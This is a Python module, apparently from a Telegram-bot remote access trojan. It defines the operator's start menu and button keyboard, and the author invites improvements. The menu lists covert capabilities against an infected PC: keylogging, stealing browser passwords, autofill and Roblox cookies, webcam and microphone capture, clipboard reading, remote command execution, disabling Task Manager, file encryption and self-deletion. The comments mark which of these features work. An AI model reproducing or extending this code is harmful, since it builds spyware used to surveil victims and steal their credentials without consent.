##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types
from aiogram.filters import Command

def register_start_menu_handler(dp):
    @dp.message(Command("start"))
    async def cmd_start(message: types.Message):
        await message.answer(
        " Приветствую, root. Я готов к работе.\n\n"
        " Доступные команды:\n\n"

        " Основное управление:\n"
        "/start — Запустить бота\n"
        "/pc_data — Получить информацию о ПК\n"
        "/network_diagnostics — Диагностика сети\n"
        "/shutdown_pc — Выключить ПК\n"
        "/restart_pc — Перезагрузить ПК\n"
        "/self_destruction — Удалить бота с устройства\n\n"

        " Безопасность и защита:\n"
        "/antivirus — Проверить антивирусные программы\n"
        "/cmd_boom — Вывести ошибку CMD\n"
        "/close_task_manager — Закрыть диспетчер задач\n\n"

        " Скриншоты и запись:\n"
        "/screenshot — Сделать скриншот\n"
        "/snapshot — Фото с веб-камеры\n"
        "/web_record — Видеозапись с веб-камеры\n"
        "/audio_record — Запись звука с микрофона\n"
        "/play_sound — Проиграть звук\n\n"

        " Мониторинг:\n"
        "/key_logger — Запустить кейлоггер\n"
        "/key_logs — Получить лог клавиш\n"
        "/clipboard_content — Буфер обмена\n"
        "/chrome_history — История Chrome\n"
        "/opera_history — История Opera\n"
        "/autofill — Автозаполнения браузера\n" ## NEW
        "/passwords — Пароли браузера\n" ## NEW
        "/robloxcookie — Получить Roblox cookie\n\n"
        "/processes — Активные процессы\n"
        "/fullprocesses — Все процессы\n"
        "/terminate_process — Завершить процесс\n\n"

        " Файлы и директории:\n"
        "/cmd — открыть командную строку\n"
        "/send_file — Получить файл\n"
        "/upload_file — Загрузить файл\n"
        "/delete_file — Удалить файл\n"
        "/move_file — Переместить файл\n"
        "/create_folder — Создать папку\n"
        "/delete_folder — Удалить папку\n"
        "/show_directory_content — Список файлов\n"
        "/change_directory — Сменить директорию\n\n"

        " Удалённые действия:\n"
        "/open_url — Открыть ссылку в браузере\n"
        "/alt_f4 — Закрыть активное окно\n"
        "/minimize_all_windows — Свернуть все окна\n"
        "/change_wallpaper — Сменить обои рабочего стола\n\n"

        " Управление звуком:\n"
        "/mute_sound — Выключить звук\n"
        "/unmute_sound — Включить звук\n"
        "/set_volume_100 — Установить громкость 100%\n\n"

        " Шифрование:\n"
        "/encrypt_file — Зашифровать файл\n"
        "/decipher_file — Расшифровать файл\n"
    )



        kb = [
            [ 
                types.KeyboardButton(text="Антивирус"),                     # Working good
                types.KeyboardButton(text="Скриншот"),                      # FIXED  Working good
            ],
            [
                types.KeyboardButton(text="Процесы"),                       # Working good    
                types.KeyboardButton(text="Фото с камеры")                  # Working good
            ],
            [
                types.KeyboardButton(text="Полный отчет по процесам"),      # Working good
                types.KeyboardButton(text="Завершить процесс")              # Working good
            ],
            [
                types.KeyboardButton(text="Создать папку"),                 # Working good
                types.KeyboardButton(text="Удалить папку")                  # Working good
            ],
            [
                #types.KeyboardButton(text="Содержание директории"), working bad (maybe fixed later)       
                types.KeyboardButton(text="Переместиться по директории [ Просмотр папок ]")                # Working good
            ],
            [
                types.KeyboardButton(text="Данные ПК"),                     # Working good
                types.KeyboardButton(text="Диагностика сети")               # Working good
            ],
            [
                types.KeyboardButton(text="Запись с веб камеры"),           # Working good
                types.KeyboardButton(text="Запись аудио")                   # Working good
            ],
            [
                types.KeyboardButton(text="Открыть файл"),                  # Working good
                types.KeyboardButton(text="Загрузить файл")                 # Working good
            ],
            [
                types.KeyboardButton(text="Скачать файл"),                  # Working good
                types.KeyboardButton(text="Удалить файл")                   # Working good
            ],
            [
                types.KeyboardButton(text="Зашифровать файл"),              # Working good
                types.KeyboardButton(text="Расшифровать файл")              # Working good
            ],
            [
                types.KeyboardButton(text="История хрома"),                 # Working good
                types.KeyboardButton(text="История оперы")                  # Working good
            ],
            [
                types.KeyboardButton(text="Автозаполнения браузера [new]"), # NEW  Working good
                types.KeyboardButton(text="Пароли браузера [new]")          # NEW  Working bad
            ],
            [
                types.KeyboardButton(text="Роблокс куки [new]"),            # NEW  Working good (with out Opera Gx)
                types.KeyboardButton(text="Командная строка [new]")         # NEW  Working good
            ],
            [
                types.KeyboardButton(text="ALT + F4"),                      # Working good
                types.KeyboardButton(text="Свернуть все окна")              # Working good
            ],
            [
                types.KeyboardButton(text="Посмотреть буфер обмена"),       # Working bad (fix later)
                types.KeyboardButton(text="Изменить буфер обмена")          # Working good
            ],
            [
                types.KeyboardButton(text="Закрыть диспетчер задач"),       # Working good
                types.KeyboardButton(text="Открыть ссылку")                 # Working good
            ],
            [
                types.KeyboardButton(text="Включить звук"),                 # Working good
                types.KeyboardButton(text="Выключить звук")                 # Working good
            ],
            [
                types.KeyboardButton(text="Звук на 100%"),                  # Working good
                types.KeyboardButton(text="CMD бомба")                      # Working good
            ],
            [
                types.KeyboardButton(text="Выключить ПК"),                  # Working good
                types.KeyboardButton(text="Перезагрузить ПК")               # Working good
            ],
            [
                types.KeyboardButton(text="Перемистить файл"),              # Working good
                types.KeyboardButton(text="Поменять обои")                  # Working good
            ],
            [
                types.KeyboardButton(text="key logger [new]"),              # NEW  Working good
                types.KeyboardButton(text="key logs [new]")                 # NEW  Working good
            ],
            [
                types.KeyboardButton(text="воспроизвести звук [new]"),      # NEW  Working good
                types.KeyboardButton(text="Самоуничтожение")                # Working good
            ],
        ]
        keyboard = types.ReplyKeyboardMarkup(
            keyboard=kb,
            resize_keyboard=True,

        )
        await message.answer("Готов к использованию", reply_markup=keyboard)